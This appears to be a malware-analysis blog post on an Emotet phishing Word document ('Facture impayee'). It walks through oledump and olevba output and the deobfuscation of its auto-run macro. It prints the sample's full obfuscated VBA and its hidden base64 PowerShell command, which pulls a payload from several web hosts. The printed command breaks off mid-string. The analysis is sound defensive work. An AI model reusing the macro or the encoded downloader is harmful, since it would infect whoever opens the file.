# Malware: Facture-impayee-30-mai#0730-04071885.doc

[malware](/tags#malware ) [doc](/tags#doc ) [vba](/tags#vba )
[powershell](/tags#powershell ) [emotet](/tags#emotet ) [invoke-
obfuscation](/tags#invoke-obfuscation )  
  
Jun 4, 2018

Malware: Facture-impayee-30-mai#0730-04071885.doc

Interesting sample from VT which ends up being a phishing document for the
Emotet malware.

## Info

Filename | Facture-impayee-30-mai#0730-04071885.doc  
---|---  
MD5 | e6f329eef248d8124a8fa93316f54fd1  
VT Link | https://www.virustotal.com/#/file/ca6fd61f94cadd09042a14903cb37a02faaea77ced18a2629efa81aacbcf6b4c/  
  
## VBA

There’s two potential VBA modules in the doc:

    
    
    root@kali# oledump.py ca6fd61f94cadd09042a14903cb37a02faaea77ced18a2629efa81aacbcf6b4c
      1:       114 '\x01CompObj'
      2:       364 '\x05DocumentSummaryInformation'
      3:       464 '\x05SummaryInformation'
      4:      9082 '1Table'
      5:     22252 'Data'
      6:       445 'Macros/PROJECT'
      7:        86 'Macros/PROJECTwm'
      8: M    3050 'Macros/VBA/UWIbRtrdWfMu'
      9:      7854 'Macros/VBA/_VBA_PROJECT'
     10:      1304 'Macros/VBA/__SRP_0'
     11:       124 'Macros/VBA/__SRP_1'
     12:       436 'Macros/VBA/__SRP_2'
     13:       196 'Macros/VBA/__SRP_3'
     14:       589 'Macros/VBA/dir'
     15: M   23213 'Macros/VBA/oHEwnITMTRZuEi'
     16:      4096 'WordDocument'
    

There’s a bunch of obfuscated VBA. Could probably use a debugger to figure out
what’s going on.

    
    
    root@kali# olevba.py ca6fd61f94cadd09042a14903cb37a02faaea77ced18a2629efa81aacbcf6b4c
    olevba 0.51a - http://decalage.info/python/oletools
    Flags        Filename
    -----------  -----------------------------------------------------------------
    OLE:MAS-HB-- ca6fd61f94cadd09042a14903cb37a02faaea77ced18a2629efa81aacbcf6b4c
    ===============================================================================
    FILE: ca6fd61f94cadd09042a14903cb37a02faaea77ced18a2629efa81aacbcf6b4c
    Type: OLE
    -------------------------------------------------------------------------------
    VBA MACRO UWIbRtrdWfMu.cls
    in file: ca6fd61f94cadd09042a14903cb37a02faaea77ced18a2629efa81aacbcf6b4c - OLE stream: u'Macros/VBA/UWIbRtrdWfMu'
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    Function BhECP()
    On Error Resume Next
    XwqPS = Fix(97430 / CSng(99464) * pwtlVG * GiijKL)
    VhBn = CDate(82074)
    zdFiiH = Fix(29418 / CSng(51547) * fwdpU * uwMnjE)
    VhBn = CDate(27996)
    BhECP = zzPIMqlwTV + KKSTchjPBdw + VFBkOjPmWsC + mKLLZavlsWj + uoRZb + PRXiVf + vVvvbii + KmhCMwm + VLuBz + zlRFZkdAj
    hmPkYq = Fix(65702 / CSng(86776) * jEsmMU * ZZXVG)
    VhBn = CDate(43323)
    End Function
    Sub Autoopen()
    On Error Resume Next
    Almkiw = Fix(46844 / CSng(19446) * jzYrPW * kqmHzk)
    VhBn = CDate(53500)
    pNTOsHzwn (BhECP)
    iirNG = Fix(63556 / CSng(86915) * KJPwl * AuTWS)
    VhBn = CDate(17939)
    End Sub
    Function pNTOsHzwn(uPRHKtnCtS)
    On Error Resume Next
    ncFCin = Fix(59825 / CSng(39286) * fPKdC * HKDFq)
    VhBn = CDate(45850)
    LGKvJm = dfTfMzoGwVC + Shell(ZkmfKPG + (Chr(vbKeyP)) + aXiqs + uPRHKtnCtS + kHmpWzdO, AwAJnWj + vbHide + FAaDYZazfD)
    hAXFd = Fix(80950 / CSng(83352) * aSSTuC * KXtOFv)
    VhBn = CDate(57578)
    End Function
    
    -------------------------------------------------------------------------------
    VBA MACRO oHEwnITMTRZuEi.bas
    in file: ca6fd61f94cadd09042a14903cb37a02faaea77ced18a2629efa81aacbcf6b4c - OLE stream: u'Macros/VBA/oHEwnITMTRZuEi'
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    Function zzPIMqlwTV()
    On Error Resume Next
    pXbqY = Fix(31734 / CSng(12006) * QHiiCX * APdjw)
    VhBn = CDate(94076)
    VoHvjkjwsjn = "owersH" + "eLL -" + "WinDo" + "wsTyl" + "e hidden " + "-e SQBuAFYAb" + "wBrAGUA" + "LQBlAHgAcABSA" + "GUAUwBzAEkAbwB"
    JzbQMK = Fix(1806 / CSng(84624) * btnrVb * RjinoJ)
    VhBn = CDate(77808)
    OCaWla = "OACgAKAAoAC" + "gAIgB7A" + "DEAMwB9AHsA" + "OAA0AH"
    QKMAo = Fix(79158 / CSng(97019) * bwNbPI * vuYdH)
    VhBn = CDate(70948)
    PSwpAtci = "0AewAzADcAfQ" + "B7ADYAMAB9" + "AHsAO" + "QA3AH"
    ffZoM = Fix(5214 / CSng(38531) * CzKMz * zADoc)
    VhBn = CDate(7735)
    dhwnOiGB = "0AewA" + "0ADYA" + "fQB7ADEANQB" + "9AHsAOQAwAH" + "0AewA5ADM" + "AfQB7A"
    sHzLJ = Fix(55563 / CSng(67087) * QfjiCi * bzdvVS)
    VhBn = CDate(92434)
    IlXhQvB = "DEAMAB9" + "AHsAMQAxADEA" + "fQB7ADEANwB9AHs" + "AMgAwAH0AewAx"
    RDICz = Fix(89521 / CSng(38878) * ijCnXa * CZlQlU)
    VhBn = CDate(57522)
    iQscmufFQwS = "ADEAfQB7ADkANgB" + "9AHsAMgA0AH0" + "AewAzADgAfQB7" + "ADEAMQA0AH0Ae"
    zWRZDL = Fix(63451 / CSng(65882) * wtiIAa * wwqCzz)
    VhBn = CDate(84332)
    jEmHCTAjo = "wAzADMAfQB7ADEA" + "OAB9A" + "HsAOQAxAH0Ae" + "wA3ADYAfQB7ADM" + "AMgB9AHsANQA" + "xAH0AewA2A"
    zzPIMqlwTV = VoHvjkjwsjn + OCaWla + PSwpAtci + dhwnOiGB + IlXhQvB + iQscmufFQwS + jEmHCTAjo
    End Function
    Function KKSTchjPBdw()
    On Error Resume Next
    BXaVk = Fix(4127 / CSng(19949) * nVLfjV * czwIq)
    VhBn = CDate(57905)
    nbwqkBoH = "DUAfQB7ADkAOQB9" + "AHsAMwAwAH0AewA" + "xADQAfQB7" + "ADIAOAB9AHsA"
    UCzzSp = Fix(56385 / CSng(53542) * ziHYjl * zrmzv)
    VhBn = CDate(75226)
    IuCOvv = "NwAzAH" + "0AewAyADYAfQB7A" + "DYAOQB" + "9AHsANAAxA" + "H0AewA3ADQAfQ" + "B7ADcANwB" + "9AHsAMgA5AH0Aew" + "A2ADMA" + "fQB7ADM"
    uEdjNE = Fix(98234 / CSng(83624) * iJCYW * kVQLlO)
    VhBn = CDate(2047)
    bcMcjRD = "ANAB9AH" + "sANAA" + "3AH0AewA" + "4ADIAfQB7AD" + "EAMAAyAH0Aew" + "A3ADgAfQB7ADU" + "AMAB9AHsAMQB9AH"
    wjrmA = Fix(32023 / CSng(7483) * whNEuo * PXkFd)
    VhBn = CDate(55850)
    QzbiPsDsDt = "sANAAzAH0AewA1" + "ADkAfQB7" + "ADUANAB9AH" + "sAOQAyAH0AewAy" + "ADEAfQB7" + "ADcAf"
    dNoMH = Fix(33369 / CSng(68220) * Batjjw * RwazA)
    VhBn = CDate(25039)
    SQYmNmhDo = "QB7AD" + "gAMAB9AHsAMQAw" + "ADYAfQB" + "7ADgAfQB7AD" + "gANQB9AHs" + "AMwAxAH0AewA4"
    KRqvL = Fix(2271 / CSng(76380) * IXvhF * woImuM)
    VhBn = CDate(60606)
    LPUHS = "ADgAfQB7ADUAMg" + "B9AHsANQA3" + "AH0Ae" + "wA2AD" + "EAfQB7ADQAN"
    KKSTchjPBdw = nbwqkBoH + IuCOvv + bcMcjRD + QzbiPsDsDt + SQYmNmhDo + LPUHS
    End Function
    Function VFBkOjPmWsC()
    On Error Resume Next
    LOIMsG = Fix(74397 / CSng(59515) * cBICXW * FiwAR)
    VhBn = CDate(41592)
    wtMKfpjT = "QB9AHsAMgAyAH0A" + "ewAzAH0Aew" + "AxADAAMwB" + "9AHsANQA4AH0Aew"
    wrsTJR = Fix(21417 / CSng(11863) * qXGbm * IhOdsT)
    VhBn = CDate(61241)
    kiEdjlkvzz = "A2ADQAfQB7AD" + "QAOQB9AHsAMAB9A" + "HsAOQA1AH0A" + "ewA1ADYAfQB7AD" + "QANAB9AHsAMQAw" + "ADUAfQB7A" + "DYAMgB9AHsA" + "MQAxADAAfQB7"
    bbRwhM = Fix(31371 / CSng(59171) * pdKVA * cNUWBR)
    VhBn = CDate(58852)
    sXaQp = "ADIANQB9AHsA" + "NQA1AH0Ae" + "wA1AD" + "MAfQB" + "7ADYANwB9AHsA" + "OQA4AH0AewAx" + "ADAANwB9AHsA" + "MQA5AH0Aew"
    vZGZO = Fix(74319 / CSng(76162) * RStQss * itkLB)
    VhBn = CDate(31094)
    udOVI = "A3ADAAfQB7" + "ADQAOAB9" + "AHsAO" + "QA0AH0AewAyADc"
    ciIulQ = Fix(45792 / CSng(94543) * fzKWWa * BsiMLr)
    VhBn = CDate(52897)
    pmSIaw = "AfQB7ADc" + "ANQB9AH" + "sANgB9A" + "HsAOQB9AHsANAAy" + "AH0Aew" + "A4ADEAfQ" + "B7ADEAMQA2AH0" + "AewAxA" + "DEAMwB9AHsAMwA1" + "AH0AewA3ADEAf"
    ukrqcR = Fix(11647 / CSng(55274) * wzcRT * WFUoN)
    VhBn = CDate(36826)
    IRoIzZSLKSI = "QB7ADcAOQB9A" + "HsAMQA" + "yAH0AewA4" + "ADcAfQB7ADgANgB" + "9AHsAN" + "QB9AHsAMQ" + "AwADgAfQB7ADEAM" + "AAwAH" + "0AewAxADAA"
    WwDHiT = Fix(37787 / CSng(7070) * lCYABZ * UNZUJZ)
    VhBn = CDate(48520)
    hMhpAqHbo = "NAB9AHsAMQAw" + "ADkAfQB7AD" + "EANgB9" + "AHsAMwA5AH0" + "AewAxA" + "DEANQB9A"
    VFBkOjPmWsC = wtMKfpjT + kiEdjlkvzz + sXaQp + udOVI + pmSIaw + IRoIzZSLKSI + hMhpAqHbo
    End Function
    Function mKLLZavlsWj()
    On Error Resume Next
    UhqLGr = Fix(5763 / CSng(26028) * MNsnU * mJzKMZ)
    VhBn = CDate(87685)
    DvKziiuZHkw = "HsANAB9AHsAOA" + "A5AH0A" + "ewAzADYAfQB7AD" + "EAMAAxAH" + "0AewAyAH0Ae" + "wA3AD" + "IAfQB7ADgAM"
    AzYzb = Fix(77371 / CSng(97247) * wZEmA * IwvipH)
    VhBn = CDate(75816)
    slhdqWnOG = "wB9AHsANgA" + "4AH0AewAyAD" + "MAfQB7ADYANg" + "B9AHsAMQA" + "xADIAfQB7ADQA" + "MAB9ACIAIAA" + "tAGYAJwBkACcA" + "LAAnAHAAOg" + "AvAC8AJwAsAC" + "cARwB2ACkA"
    juzinL = Fix(23268 / CSng(28771) * ZbOqN * rbZSnR)
    VhBn = CDate(37144)
    WWtzwkjs = "KAAnACwAJwBpA" + "CcALAAnAHYASQBu" + "AHYAbwBSAEcAd" + "gArAFIARwAnACw" + "AJwBUACcALAA" + "nAGYAbwByAGUA" + "YQBjACcALA" + "AnADcARg" + "AvAEAAaAB0A"
    iiJAAO = Fix(57225 / CSng(70032) * jMRdzw * nMhMi)
    VhBn = CDate(22129)
    iJTrkEadhpB = "HQAcAA6AC8" + "ALwB3AGUAcAAnA" + "CwAJwAvA" + "EkAMABnAG" + "UANAB3" + "AG8AQwAnACwA" + "JwBoA" + "CgAbQA5ADEA" + "JwAsACcAY" + "wBSAEcA"
    luNEGP = Fix(79374 / CSng(99179) * MLRwd * LAjoo)
    VhBn = CDate(64699)
    FlbJppYNHHX = "dgAnACwAJwBtAC" + "cALAAnAE8AYQA" + "nACwAJwB" + "tADkAMQBuAHM" + "AJwAsA" + "CcAZQBuAHQAO" + "wBtACcALAAnAE" + "cAdgArA" + "FIARwB2AGUAU" + "gBHAHYAJwAsA"
    vFrfYf = Fix(52246 / CSng(67342) * DWvXF * KXUwjq)
    VhBn = CDate(9597)
    LINnwoDTXi = "CcALAAgA" + "CcALAAnA" + "EcAdgApACAAcgBh" + "ACcAL" + "AAnAGUAUgBHAHYA" + "KwBSAEcA" + "dgB3AFIARwB2" + "ACsAJwAsA"
    iAXcB = Fix(65137 / CSng(55737) * WEIzIM * rKYnFH)
    VhBn = CDate(90135)
    IChVWIwtz = "CcAOgBwAHU" + "AYgBs" + "AGkAYwAg" + "ACcALAAnA"
    FEZpM = Fix(39063 / CSng(84783) * mqmJf * CaBdN)
    VhBn = CDate(514)
    FZQCLU = "G4AZA" + "BvACc" + "ALAAnAC8AN" + "ABUAFEAZgAnA" + "CwAJwB"
    mKLLZavlsWj = DvKziiuZHkw + slhdqWnOG + WWtzwkjs + iJTrkEadhpB + FlbJppYNHHX + LINnwoDTXi + IChVWIwtz + FZQCLU
    End Function
    Function uoRZb()
    On Error Resume Next
    PGdwwd = Fix(74405 / CSng(16173) * zKnzS * bsQVi)
    VhBn = CDate(8009)
    mNzHfJPLamA = "tAC8Ac" + "QBVACcALAA" + "nAEMAJwAsACcA" + "MQBZACcALAAn"
    IWCvr = Fix(14369 / CSng(96636) * btuKpw * rPrFsj)
    VhBn = CDate(83803)
    LAiisPmRMJz = "AG4AZQB0AC8ATQA" + "wACcALAA" + "nAD0AJwA" + "sACcAZQBSACcA" + "LAAnADkAJwAs" + "ACcAZQB4A" + "HQAKAAx"
    WjhfwI = Fix(25015 / CSng(85147) * muwHv * mfKRX)
    VhBn = CDate(32835)
    cFHUMCGlKb = "ADAAJwAsACc" + "ATgBlAH" + "QALgBXAGUAYgBD" + "AGwAaQAnACw" + "AJwBTAC8AQAAn" + "ACwAJwBvACcA"
    ocZjBB = Fix(58644 / CSng(48194) * mQujP * czdOB)
    VhBn = CDate(47693)
    FbYTji = "LAAnAHY" + "AbgAnAC" + "wAJwAzADMAKQA7A" + "G0AOQAxA" + "CcALAAnAH" + "kAewBtADkAMQBZ" + "ACcAL"
    vzowP = Fix(9788 / CSng(50341) * RUKdrF * SHLNw)
    VhBn = CDate(51004)
    wjJjIVBo = "AAnAFIARwB2" + "ACcALA" + "AnAGQAYQ" + "BzAGQAIAA9ACAAJ" + "gAoAFIAJw" + "AsACcAWQBVACA" + "APQAgACc" + "ALAAnA" + "G0AOQAxAF" + "MARABDACkA"
    uoRZb = mNzHfJPLamA + LAiisPmRMJz + cFHUMCGlKb + FbYTji + wjJjIVBo
    End Function
    Function PRXiVf()
    On Error Resume Next
    hNOkc = Fix(5582 / CSng(19682) * IPTQhZ * FlZwdU)
    VhBn = CDate(93295)
    aqDCwFhpnq = "OwAmACcALAAn" + "AGMAaAB7AH0A" + "fQAnACwAJwA5ADE" + "AbgBzAGEAZAAnAC" + "wAJwBhAHM"
    CYDWhV = Fix(5921 / CSng(76154) * znSbhf * XYdMvK)
    VhBn = CDate(52745)
    mEIXLftljVR = "AZgBjACcALAAnAG" + "sAbgBvAGMAJ" + "wAsACcA" + "YQBzAEwA" + "QgAnACwAJwBvAG" + "4AcwBwAG8"
    jaCao = Fix(95893 / CSng(94318) * kdMMZj * SFcrSt)
    VhBn = CDate(13138)
    XFtnUaIfhs = "AcgB0AHMALgBj" + "AG8AJwA" + "sACcAU" + "gAnACwAJwBBA" + "CcALAAnADkA"
    XGzbF = Fix(83486 / CSng(69752) * swfqHT * ziAAhz)
    VhBn = CDate(39835)
    bfOzsiVl = "MQBOAFMAQ" + "gAnACwAJwAtAG" + "QAZQBzA" + "GkAZwBuAC4AJw" + "AsACcAaAB0AHQA" + "JwAsACcAYgBq" + "AGUAYwB0ACcA" + "LAAnAHQAdABw"
    DrvKH = Fix(36777 / CSng(35562) * iZJiT * WrvApU)
    VhBn = CDate(29277)
    UjOBq = "ADoALw" + "AvACcALAAnAFM" + "AcABs" + "AGkAdAAoA" + "FIARwB2A" + "EAAUgBHAHYAJwAs" + "ACcAbw"
    pUzccN = Fix(33679 / CSng(86941) * TDnuk * jdUZn)
    VhBn = CDate(2609)
    SSJjtCwGnG = "ByACc" + "ALAAnAE" + "YATgBWAC8AUg" + "BHAHYAL" + "gAnACwAJwAvAG0" + "AeQBrACcALAAn"
    woJIH = Fix(17672 / CSng(8578) * HADJBb * iqErl)
    VhBn = CDate(936)
    zDSFUXYiIB = "AGwAJwAsACcA" + "TAAvAEAAaAB0AH" + "QAJwAsAC" + "cALgAnAC" + "wAJwB" + "HAHYAJ" + "wAsACcAZQB3AGkA"
    bfwlhP = Fix(44821 / CSng(39902) * brYVKS * FIorM)
    VhBn = CDate(5230)
    SnMHoMGstI = "cwB0ACcALAA" + "nAEAAaAB0AHQA" + "cAA6AC8ALwBtAGE" + "AZABkAG" + "kAbgAnA" + "CwAJwAwADAAMAA" + "sACAAMgA" + "4ADIAMQAnA" + "CwAJwBwAHMAOgA" + "vAC8AYQBsAH"
    PRXiVf = aqDCwFhpnq + mEIXLftljVR + XFtnUaIfhs + bfOzsiVl + UjOBq + SSJjtCwGnG + zDSFUXYiIB + SnMHoMGstI
    End Function
    Function vVvvbii()
    On Error Resume Next
    kjiVwi = Fix(40018 / CSng(92614) * QJNdL * bpKmG)
    VhBn = CDate(54271)
    cwvVwOK = "UAZwBhACcALA" + "AnAFIARwB2ACkAI" + "ABTAHkAcwB0ACcA" + "LAAnACkA" + "JwAsACcAKQA7AG" + "0AOQAxAFMAR" + "ABDACAAJwAsACcA" + "RAAnAC" + "wAJwAgAG0AJwAs" + "ACcAKwAg"
    cFALV = Fix(98837 / CSng(67868) * JcYvMC * tZqZfb)
    VhBn = CDate(15289)
    qGkJufR = "AFIARwB2ADUAc" + "QB3AFIAR" + "wB2ACAAKwAg" + "AG0AJwAsAC" + "cAWQBVAC4AZABpA"
    wpJjj = Fix(98748 / CSng(63583) * wHSGd * mJVMT)
    VhBn = CDate(14411)
    FuzJzcdDZWm = "HkARABvAEEAMA" + "A5AFcAJwAsACcA" + "bQA5ADEAJwAs" + "ACcAMQBOAFMAQgA" + "gACcALAAnAGEAJw"
    phwTcv = Fix(71521 / CSng(93647) * wqUsDW * QCzcD)
    VhBn = CDate(53758)
    KPLTQshjrCF = "AsACcARwB" + "2ACkAOwAnACwA" + "JwAtACcALAA" + "nAHMAZAAuAG4A" + "JwAsA" + "CcACgAnA" + "CwAJwBuAGwAQQA" + "wADkAJwAsACcA" + "ZgB1AG4" + "AJwAsACcAI"
    vVvvbii = cwvVwOK + qGkJufR + FuzJzcdDZWm + KPLTQshjrCF
    End Function
    Function KmhCMwm()
    On Error Resume Next
    uvVYmj = Fix(7960 / CSng(35426) * AfHHK * EDvcP)
    VhBn = CDate(21064)
    mWTkHjvdtkm = "ABpACcALAAn" + "AEQAQwBYACAA" + "PQAgAFI" + "ARwB2ACcALA" + "AnAFM" + "AJwAsACc"
    mkRPzF = Fix(20223 / CSng(42957) * dNuEYG * wPcih)
    VhBn = CDate(38866)
    wtRRWDz = "AYQAnACwAJwBZAC" + "cALAAnAGkA" + "eQAoAG0AOQAxAG" + "EAcwBmAG" + "MALgBkAGk" + "AeQAnAC" + "wAJwBk" + "AEYASQBBADAAO" + "QBsAGUA" + "ZAAnACwA"
    vOBAz = Fix(88113 / CSng(62021) * McSJkG * jwHlV)
    VhBn = CDate(4734)
    qWXJpJE = "JwBoACc" + "ALAAnAHYA" + "awBSAEc" + "AdgArACcA"
    NGqzfz = Fix(25072 / CSng(75574) * uRXVAw * MczDB)
    VhBn = CDate(33090)
    ZzwHazv = "LAAnACsAUgBHAHY" + "AdwAtAG8AYgA" + "nACwAJwBSAE" + "cAdgAnACwAJwBnA" + "CcALAAn" + "AGoAZQAnACwAJw" + "AgACsAIA" + "AoAFIAR"
    OWQbjd = Fix(43477 / CSng(92379) * KBBuJA * iNYwY)
    VhBn = CDate(83841)
    YnCiODVAt = "wB2AC4A" + "ZQB4AFIARw" + "B2ACsAUgBHAH" + "YAJwAs" + "ACcAZQAnACwAJwA" + "7AG0AOQA" + "nACwAJwBuACc"
    lWnuv = Fix(18102 / CSng(42249) * twUcbP * jJJwS)
    VhBn = CDate(25817)
    lBulMlnjf = "ALAAn" + "AD0AIA" + "BtADkAJwAsACcAZ" + "QBtAC4AJw" + "AsACcAcgBBAD" + "AAOQBpAEEAMAA5" + "ACcALAAnA" + "GUALQBJAHQAZQ"
    KmhCMwm = mWTkHjvdtkm + wtRRWDz + qWXJpJE + ZzwHazv + YnCiODVAt + lBulMlnjf
    End Function
    Function VLuBz()
    On Error Resume Next
    zBuMO = Fix(31328 / CSng(80273) * UOXJfF * jbmdLH)
    VhBn = CDate(10008)
    XtFtCT = "BtAFIAJwAsAC" + "cADQAnACwA" + "JwB2ACc" + "ALAAnAE4AJw" + "AsACcASABMADE" + "ALwAnACwAJw" + "BkAHMALgBjAG8" + "AbQAn" + "ACwAJwAxAG"
    hZwMjP = Fix(74189 / CSng(49951) * zQWlz * uFJRbG)
    VhBn = CDate(8985)
    oEpwTsLuNp = "UAbgB2ACcAL" + "AAnAG8AUwB0AC" + "cALAAnAGcAZ" + "ABpAHkAKAApACcA" + "LAAnAG" + "cALgAnA" + "CwAJwArAF" + "IARwB2A" + "HQAUgAnACwAJwA7"
    jQnai = Fix(22036 / CSng(80003) * MubNn * DJNio)
    VhBn = CDate(97108)
    bzUSqoMFLJ = "AGIAcgBlAGEA" + "awA7AH0" + "AYwBhAHQA" + "JwAsACcAMQB" + "BAEQAQwB" + "YACkAew" + "B0AHIAJwAsACc" + "ALgAo" + "AFIARw"
    OiHks = Fix(84006 / CSng(45145) * qdUdH * wspEO)
    VhBn = CDate(67775)
    ojIrRYqA = "AnACwA" + "JwAoAFIA" + "RwAnACwAJwBuACA" + "AbQA5ACcAKQ" + "ApAC0AQwBy" + "AEUAUABsAEE" + "AYwBlACAAKABbA"
    EcKmvf = Fix(4398 / CSng(1085) * tRGGV * jppTSA)
    VhBn = CDate(42884)
    XsCqDzB = "GMAaABBAHIAXQA" + "1ADMAKwBb" + "AGMAaABBAHIAXQA" + "xADEAMw" + "ArAFsAYwBo" + "AEEAcgBdADE" + "AMQA5ACkAL" + "ABbAGMAaA" + "BBAHIAX" + "QA5ADIAIAAg"
    VLuBz = XtFtCT + oEpwTsLuNp + bzUSqoMFLJ + ojIrRYqA + XsCqDzB
    End Function
    Function zlRFZkdAj()
    On Error Resume Next
    HjfAH = Fix(31201 / CSng(45764) * ZPNKFw * zMVAmk)
    VhBn = CDate(4200)
    brDilVX = "AC0AUgB" + "FAFAAbABBAGMA" + "RQAnAEEAMAA5A" + "CcALABbAGMAaABB" + "AHIAXQA5ADYALQ" + "BSAEUAUABs" + "AEEAYwB"
    BuNMz = Fix(27848 / CSng(89890) * vhMDC * fvkjP)
    VhBn = CDate(85202)
    jYFvzlVCNH = "FACAAJwBSAEc" + "AdgAnA" + "CwAWwBj" + "AGgAQQByA" + "F0AMw"
    sKcjss = Fix(14468 / CSng(94111) * kfENd * tDYPi)
    VhBn = CDate(96422)
    WajGnYGSRf = "A5ACAAL" + "QBDAH" + "IARQBQAGwAQQB" + "jAGUAIAAgACcA" + "bQA5ADEAJw" + "AsAFsAYwBoA" + "EEAcgBdADMANg" + "AgAC0AUgBF" + "AFAAbABBAGMARQA"
    cstvh = Fix(63652 / CSng(50139) * FVJjJ * lcHWnU)
    VhBn = CDate(91594)
    wLRbi = "oAFsAYw" + "BoAEEAcgBdADEAM" + "AAwACs" + "AWwBjAG" + "gAQQByAF0AMQAw" + "ADUAKwBbA" + "GMAaABBAHIAXQAx" + "ADIAMQApA" + "CwAWwB" + "jAGgAQQByAF0"
    jwpmYB = Fix(62469 / CSng(15335) * Nsahjq * KaWjiK)
    VhBn = CDate(90520)
    kjTpjONfPmi = "AMwA0ACkAKQAgAA" + "=="
    zlRFZkdAj = brDilVX + jYFvzlVCNH + WajGnYGSRf + wLRbi + kjTpjONfPmi
    End Function
    
    +------------+----------------+-----------------------------------------+
    | Type       | Keyword        | Description                             |
    +------------+----------------+-----------------------------------------+
    | AutoExec   | Autoopen       | Runs when the Word document is opened   |
    | Suspicious | Chr            | May attempt to obfuscate specific       |
    |            |                | strings (use option --deobf to          |
    |            |                | deobfuscate)                            |
    | Suspicious | Shell          | May run an executable file or a system  |
    |            |                | command                                 |
    | Suspicious | vbHide         | May run an executable file or a system  |
    |            |                | command                                 |
    | Suspicious | Hex Strings    | Hex-encoded strings were detected, may  |
    |            |                | be used to obfuscate strings (option    |
    |            |                | --decode to see all)                    |
    | Suspicious | Base64 Strings | Base64-encoded strings were detected,   |
    |            |                | may be used to obfuscate strings        |
    |            |                | (option --decode to see all)            |
    +------------+----------------+-----------------------------------------+
    
    

### Decoding VBA

There’s code associated with the document, and with a module named
oHEwmITMTRZuEi. In the root document VBA, there’s an Autoopen() function. It
has a bunch of garbage, but halfware through calls `pNTOsHzwn (BhECP)`. Those
are the other two functions in that section.

`BhECP` has one meaningful line:

`BhECP = zzPIMqlwTV + KKSTchjPBdw + VFBkOjPmWsC + mKLLZavlsWj + uoRZb + PRXiVf
+ vVvvbii + KmhCMwm + VLuBz + zlRFZkdAj`

Those are all functions in the module, and they return bits of strings.

The other function, `pNTOsHzwn`, has one meaningful line as well:

`LGKvJm = dfTfMzoGwVC + Shell(ZkmfKPG + (Chr(vbKeyP)) + aXiqs + uPRHKtnCtS +
kHmpWzdO, AwAJnWj + vbHide + FAaDYZazfD)`

And even all of that is junk, except for `Shell('P' + input string`.

Opening in `Word` and putting a break at the interesting line in `pT0sHzwn`
reveals the encoded powershell.

## Encoded Powershell

Starting with powershell (currently from email), it’s encoded:

    
    
    PowersHeLL -WinDowsTyle hidden -e SQBuAFYAbwBrAGUALQBlAHgAcABSAGUAUwBzAEkAbwBOACgAKAAoACgAIgB7ADEAMwB9AHsAOAA0AH0AewAzADcAfQB7ADYAMAB9AHsAOQA3AH0AewA0ADYAfQB7ADEANQB9AHsAOQAwAH0AewA5ADMAfQB7ADEAMAB9AHsAMQAxADEAfQB7ADEANwB9AHsAMgAwAH0AewAxADEAfQB7ADkANgB9AHsAMgA0AH0AewAzADgAfQB7ADEAMQA0AH0AewAzADMAfQB7ADEAOAB9AHsAOQAxAH0AewA3ADYAfQB7ADMAMgB9AHsANQAxAH0AewA2ADUAfQB7ADkAOQB9AHsAMwAwAH0AewAxADQAfQB7ADIAOAB9AHsANwAzAH0AewAyADYAfQB7ADYAOQB9AHsANAAxAH0AewA3ADQAfQB7ADcANwB9AHsAMgA5AH0AewA2ADMAfQB7ADMANAB9AHsANAA3AH0AewA4ADIAfQB7ADEAMAAyAH0AewA3ADgAfQB7ADUAMAB9AHsAMQB9AHsANAAzAH0AewA1ADkAfQB7ADUANAB9AHsAOQAyAH0AewAyADEAfQB7ADcAfQB7ADgAMAB9AHsAMQAwADYAfQB7ADgAfQB7ADgANQB9AHsAMwAxAH0AewA4ADgAfQB7ADUAMgB9AHsANQA3AH0AewA2ADEAfQB7ADQANQB9AHsAMgAyAH0AewAzAH0AewAxADAAMwB9AHsANQA4AH0AewA2ADQAfQB7ADQAOQB9AHsAMAB9AHsAOQA1AH0AewA1ADYAfQB7ADQANAB9AHsAMQAwADUAfQB7ADYAMgB9AHsAMQAxADAAfQB7ADIANQB9AHsANQA1AH0AewA1ADMAfQB7ADYANwB9AHsAOQA4AH0AewAxADAANwB9AHsAMQA5AH0AewA3ADAAfQB7ADQAOAB9AHsAOQA0AH0AewAyADcAfQB7ADcANQB9AHsANgB9AHsAOQB9AH
    sANAAyAH0AewA4ADEAfQB7ADEAMQA2AH0AewAxADEAMwB9AHsAMwA1AH0AewA3ADEAfQB7ADcAOQB9AHsAMQAyAH0AewA4ADcAfQB7ADgANgB9AHsANQB9AHsAMQAwADgAfQB7ADEAMAAwAH0AewAxADAANAB9AHsAMQAwADkAfQB7ADEANgB9AHsAMwA5AH0AewAxADEANQB9AHsANAB9AHsAOAA5AH0AewAzADYAfQB7ADEAMAAxAH0AewAyAH0AewA3ADIAfQB7ADgAMwB9AHsANgA4AH0AewAyADMAfQB7ADYANgB9AHsAMQAxADIAfQB7ADQAMAB9ACIAIAAtAGYAJwBkACcALAAnAHAAOgAvAC8AJwAsACcARwB2ACkAKAAnACwAJwBpACcALAAnAHYASQBuAHYAbwBSAEcAdgArAFIARwAnACwAJwBUACcALAAnAGYAbwByAGUAYQBjACcALAAnADcARgAvAEAAaAB0AHQAcAA6AC8ALwB3AGUAcAAnACwAJwAvAEkAMABnAGUANAB3AG8AQwAnACwAJwBoACgAbQA5ADEAJwAsACcAYwBSAEcAdgAnACwAJwBtACcALAAnAE8AYQAnACwAJwBtADkAMQBuAHMAJwAsACcAZQBuAHQAOwBtACcALAAnAEcAdgArAFIARwB2AGUAUgBHAHYAJwAsACcALAAgACcALAAnAEcAdgApACAAcgBhACcALAAnAGUAUgBHAHYAKwBSAEcAdgB3AFIARwB2ACsAJwAsACcAOgBwAHUAYgBsAGkAYwAgACcALAAnAG4AZABvACcALAAnAC8ANABUAFEAZgAnACwAJwBtAC8AcQBVACcALAAnAEMAJwAsACcAMQBZACcALAAnAG4AZQB0AC8ATQAwACcALAAnAD0AJwAsACcAZQBSACcALAAnADkAJwAsACcAZQB4AHQAKAAxADAAJwAsACcATgBlAHQALgBXAGUAYgBDAGwAaQAnACwAJwBTAC8AQAAnACwAJwBvA
